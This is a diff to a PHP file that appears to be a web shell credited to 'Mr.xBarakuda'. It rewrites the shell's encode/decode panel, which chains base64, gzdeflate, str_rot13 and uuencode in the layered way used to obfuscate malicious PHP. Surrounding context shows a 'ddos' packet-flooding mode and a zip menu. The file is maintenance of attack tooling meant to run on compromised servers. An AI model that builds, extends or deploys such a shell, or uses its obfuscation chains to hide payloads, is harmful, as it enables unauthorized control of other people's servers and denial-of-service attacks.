@@ -1198,162 +1198,153 @@ elseif ($_GET['do'] == 'ddos') {
                         echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s ";
                     }
                 }
-                elseif ($_GET['do'] == 'endecode') {
-                    @ini_set('output_buffering', 0);
-                    @ini_set('display_errors', 0);
-                    $text = $_POST['code'];
-                    ?>
-                    <center><h3>Encode And Decode By Mr.xBarakuda</h3>
-                        <form method="post"><br>
-                            <textarea cols='60' rows='10' name="code" placeholder="input..."></textarea><br><br>
-                            <select size="1" name="kuds">
-                                <option value="urlencode">url</option>
-                                <option value="base64">base64</option>
-                                <option value="ur">convert_uu</option>
-                                <option value="json">json</option>
-                                <option value="gzinflates">gzinflate - base64</option>
-                                <option value="str2">str_rot13 - base64</option>
-                                <option value="gzinflate">str_rot13 - gzinflate - base64</option>
-                                <option value="gzinflater">gzinflate - str_rot13 - base64</option>
-                                <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
-                                <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
-                                <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
-                                <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
-                                <option value="hexencode">Hex</option>
-                                <option value="str_rot13">ROT13 Hash</option>
-                                <option value="strlen">strlen</option>
-                                <option value="xxx">unescape</option>
-                                <option value="bbb">charAt</option>
-                                <option value="aaa">chr - bin2hex - substr</option>
-                                <option value="www">chr</option>
-                                <option value="sss">htmlspecialchars</option>
-                                <option value="eee">escape</option>
-                            </select>&nbsp;<input type='submit' name='encd' value='Encode'> <input type='submit' name='decd' value='Decode'>
-                        </form></center>
-                        <br>
-                        <?php
-                        $submit = $_POST['encd'];
-                        if (isset($submit)) {
-                            $op = $_POST["kuds"];
-                            switch ($op) {
-                                case 'base64':
-                                $codi = base64_encode($text);
-                                break;
-                                case 'str':
-                                $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
-                                break;
-                                case 'json':
-                                $codi = json_encode(utf8_encode($text));
-                                break;
-                                case 'gzinflate':
-                                $codi = base64_encode(gzdeflate(str_rot13($text)));
-                                break;
-                                case 'gzinflater':
-                                $codi = base64_encode(str_rot13(gzdeflate($text)));
-                                break;
-                                case 'gzinflatex':
-                                $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
-                                break;
-                                case 'gzinflatew':
-                                $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
-                                break;
-                                case 'gzinflates':
-                                $codi = base64_encode(gzdeflate($text));
-                                break;
-                                case 'str2':
-                                $codi = base64_encode(str_rot13($text));
-                                break;
-                                case 'urlencode':
-                                $codi = rawurlencode($text);
-                                break;
-                                case 'ur':
-                                $codi = convert_uuencode($text);
-                                break;
-                                case 'url':
-                                $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
-                                break;
-                                case 'hexencode':
-                                $codi = bin2hex($text);
-                                break;
-                                case 'str_rot13':
-                                $codi = str_rot13($text);
-                                break;
-                                case 'strlen':
-                                $codi = strlen($text);
-                                break;
-                                case 'xxx':
-                                $codi = strlen(bin2hex($text));
-                                break;
-                                case 'bbb':
-                                $codi = htmlentities(utf8_decode($text));
-                                break;
-                                case 'aaa':
-                                $codi = chr(bin2hex(substr($text)));
-                                break;
-                                case 'www':
-                                $codi = chr($text);
-                                break;
-                                case 'sss':
-                                $codi = htmlspecialchars($text);
-                                break;
-                                case 'eee':
-                                $codi = addslashes($text);
-                                break;
-                                default:
-                                break;
-                            }
-                        }
+elseif ($_GET['do'] == 'endecode') {
+@ini_set("display_errors", 0);
+@ini_set("output_buffering", 0);
+function safe_gzinflate($data) {
+    $decoded = @gzinflate($data);
+    if ($decoded === false) {
+        $decoded = @gzinflate($data, -15);
+    }
+    return $decoded;
+}
+$text = $_POST["code"] ?? "";
+$output = "";
+$selected_method = $_POST["kuds"] ?? "";
+$action = "";
 
-                        $submit = $_POST['decd'];
-                        if (isset($submit)) {
-                            $op = $_POST["kuds"];
-                            switch ($op) {
-                                case 'base64':
-                                $codi = base64_decode($text);
-                                break;
-                                case 'str':
-                                $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
-                                break;
-                                case 'json':
-                                $codi = utf8_decode(json_decode($text));
-                                break;
-                                case 'gzinflate':
-                                $codi = str_rot13(gzinflate(base64_decode($text)));
-                                break;
-                                case 'gzinflater':
-                                $codi = gzinflate(str_rot13(base64_decode($text)));
-                                break;
-                                case 'gzinflatex':
-                                $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
-                                break;
-                                case 'gzinflatew':
-                                $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
-                                break;
-                                case 'gzinflates':
-                                $codi = gzinflate(base64_decode($text));
-                                break;
-                                case 'str2':
-                                $codi = str_rot13(base64_decode($text));
-                                break;
-                                case 'urlencode':
-                                $codi = rawurldecode($text);
-                                break;
-                                case 'ur':
-                                $codi = convert_uudecode($text);
-                                break;
-                                case 'hexencode':
-                                $codi = quoted_printable_decode($text);
-                                break;
-                                case 'url':
-                                $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($text))))));
-                                break;
-                                default:
-                                break;
-                            }
-                        }
-                        $html = htmlentities(stripslashes($codi));
-                        echo "<textarea cols='60' rows='10' placeholder='output...'>" . $html . "</textarea><br>";
-                    }
+if (isset($_POST["encd"])) {
+    $action = "encode";
+} elseif (isset($_POST["decd"])) {
+    $action = "decode";
+}
+
+?>
+
+<center><h3>Encode And Decode By Mr.xBarakuda</h3>
+    <form method="post">
+        <br>
+        <textarea cols="60" rows="10" name="code" placeholder="input..."><?php echo htmlspecialchars($text); ?></textarea>
+        <br><br>
+        <select size="1" name="kuds">
+            <option value="urlencode" <?php echo ($selected_method == "urlencode") ? "selected" : ""; ?>>URL</option>
+            <option value="base64" <?php echo ($selected_method == "base64") ? "selected" : ""; ?>>Base64</option>
+            <option value="convert_uu" <?php echo ($selected_method == "convert_uu") ? "selected" : ""; ?>>Convert_UU</option>
+            <option value="json" <?php echo ($selected_method == "json") ? "selected" : ""; ?>>JSON</option>
+            <option value="gzinflate_base64" <?php echo ($selected_method == "gzinflate_base64") ? "selected" : ""; ?>>Gzinflate - Base64</option>
+            <option value="str_rot13_base64" <?php echo ($selected_method == "str_rot13_base64") ? "selected" : ""; ?>>Str_rot13 - Base64</option>
+            <option value="str_rot13_gzinflate_base64" <?php echo ($selected_method == "str_rot13_gzinflate_base64") ? "selected" : ""; ?>>Str_rot13 - Gzinflate - Base64</option>
+            <option value="gzinflate_str_rot13_base64" <?php echo ($selected_method == "gzinflate_str_rot13_base64") ? "selected" : ""; ?>>Gzinflate - Str_rot13 - Base64</option>
+            <option value="gzinflate_str_rot13_gzinflate_base64" <?php echo ($selected_method == "gzinflate_str_rot13_gzinflate_base64") ? "selected" : ""; ?>>Gzinflate - Str_rot13 - Gzinflate - Base64</option>
+            <option value="complex_chain_1" <?php echo ($selected_method == "complex_chain_1") ? "selected" : ""; ?>>Complex Chain 1</option>
+            <option value="complex_chain_2" <?php echo ($selected_method == "complex_chain_2") ? "selected" : ""; ?>>Complex Chain 2</option>
+            <option value="complex_chain_3" <?php echo ($selected_method == "complex_chain_3") ? "selected" : ""; ?>>Complex Chain 3 (New)</option>
+            <option value="hex" <?php echo ($selected_method == "hex") ? "selected" : ""; ?>>Hex</option>
+            <option value="str_rot13" <?php echo ($selected_method == "str_rot13") ? "selected" : ""; ?>>ROT13 Hash</option>
+            <option value="htmlspecialchars" <?php echo ($selected_method == "htmlspecialchars") ? "selected" : ""; ?>>HTML Special Chars</option>
+            <option value="addslashes" <?php echo ($selected_method == "addslashes") ? "selected" : ""; ?>>Add Slashes</option>
+            <!-- Opsi berikut tidak memiliki fungsi decode langsung yang reversibel atau merupakan fungsi informasi -->
+            <option value="strlen" <?php echo ($selected_method == "strlen") ? "selected" : ""; ?>>Strlen (Informasi)</option>
+            <option value="chr" <?php echo ($selected_method == "chr") ? "selected" : ""; ?>>Chr (Transformasi)</option>
+            <option value="bin2hex_strlen" <?php echo ($selected_method == "bin2hex_strlen") ? "selected" : ""; ?>>Bin2hex & Strlen (Informasi)</option>
+            <option value="htmlentities_utf8_decode" <?php echo ($selected_method == "htmlentities_utf8_decode") ? "selected" : ""; ?>>HTML Entities & UTF8 Decode (Transformasi)</option>
+            <option value="chr_bin2hex_substr" <?php echo ($selected_method == "chr_bin2hex_substr") ? "selected" : ""; ?>>Chr - Bin2hex - Substr (Transformasi)</option>
+        </select>
+        &nbsp;
+        <input type="submit" name="encd" value="Encode">
+        <input type="submit" name="decd" value="Decode">
+    </form>
+</center>
+<br>
+
+<?php
+
+if (!empty($action) && !empty($text)) {
+    switch ($selected_method) {
+        case 'urlencode':
+            $output = ($action == 'encode') ? rawurlencode($text) : rawurldecode($text);
+            break;
+        case 'base64':
+            $output = ($action == 'encode') ? base64_encode($text) : base64_decode($text);
+            break;
+        case 'convert_uu':
+            $output = ($action == 'encode') ? convert_uuencode($text) : convert_uudecode($text);
+            break;
+        case 'json':
+            $output = ($action == 'encode') ? json_encode($text) : json_decode($text);
+            break;
+        case 'gzinflate_base64':
+            $output = ($action == 'encode') ? base64_encode(gzdeflate($text)) : safe_gzinflate(base64_decode($text));
+            break;
+        case 'str_rot13_base64':
+            $output = ($action == 'encode') ? base64_encode(str_rot13($text)) : str_rot13(base64_decode($text));
+            break;
+        case 'str_rot13_gzinflate_base64':
+            $output = ($action == 'encode') ? base64_encode(gzdeflate(str_rot13($text))) : str_rot13(safe_gzinflate(base64_decode($text)));
+            break;
+        case 'gzinflate_str_rot13_base64':
+            $output = ($action == 'encode') ? base64_encode(str_rot13(gzdeflate($text))) : safe_gzinflate(str_rot13(base64_decode($text)));
+            break;
+        case 'gzinflate_str_rot13_gzinflate_base64':
+            $output = ($action == 'encode') ? base64_encode(gzdeflate(str_rot13(gzdeflate($text)))) : safe_gzinflate(str_rot13(safe_gzinflate(base64_decode($text))));
+            break;
+        case 'complex_chain_1':
+            $output = ($action == 'encode') ? base64_encode(str_rot13(gzdeflate(str_rot13($text)))) : str_rot13(safe_gzinflate(str_rot13(base64_decode($text))));
+            break;
+        case 'complex_chain_2':
+            if ($action == 'encode') {
+                $output = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
+            } else {
+                $output = base64_decode(safe_gzinflate(str_rot13(convert_uudecode(safe_gzinflate(base64_decode($text))))));
+            }
+            break;
+        case 'complex_chain_3':
+            if ($action == 'encode') {
+                $output = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurlencode(str_rot13($text))))))))))));
+            } else {
+                $output = str_rot13(rawurldecode(convert_uudecode(safe_gzinflate(str_rot13(base64_decode(convert_uudecode(safe_gzinflate(rawurldecode(str_rot13(safe_gzinflate(base64_decode($text))))))))))));
+            }
+            break;
+        case 'hex':
+            $output = ($action == 'encode') ? bin2hex($text) : hex2bin($text);
+            break;
+        case 'str_rot13':
+            $output = str_rot13($text);
+            break;
+        case 'htmlspecialchars':
+            $output = ($action == 'encode') ? htmlspecialchars($text) : htmlspecialchars_decode($text);
+            break;
+        case 'addslashes':
+            $output = ($action == 'encode') ? addslashes($text) : stripslashes($text);
+            break;
+        case 'strlen':
+            $output = "Panjang string: " . strlen($text);
+            break;
+        case 'bin2hex_strlen':
+            $output = "Panjang hex dari bin2hex: " . strlen(bin2hex($text));
+            break;
+        case 'chr':
+            $output = "Fungsi chr: " . @chr((int)$text);
+            break;
+        case 'htmlentities_utf8_decode':
+            $output = "HTML Entities & UTF8 Decode: " . htmlentities(utf8_decode($text));
+            break;
+        case 'chr_bin2hex_substr':
+            $output = "Transformasi kompleks (tidak reversibel): " . "Tidak dapat didecode secara langsung.";
+            break;
+        default:
+            $output = "Metode tidak dikenal atau tidak ada aksi yang dipilih.";
+            break;
+    }
+
+    if (is_array($output) || is_object($output)) {
+        $output = print_r($output, true);
+    }
+}
+?>
+<textarea cols="60" rows="10" placeholder="output..."><?php echo htmlspecialchars($output); ?></textarea>
+<?php
+}
                     elseif ($_GET['do'] == 'zip_menu') {
                         echo "<center>";
                         echo "<h3>Zip Menu</h3>";
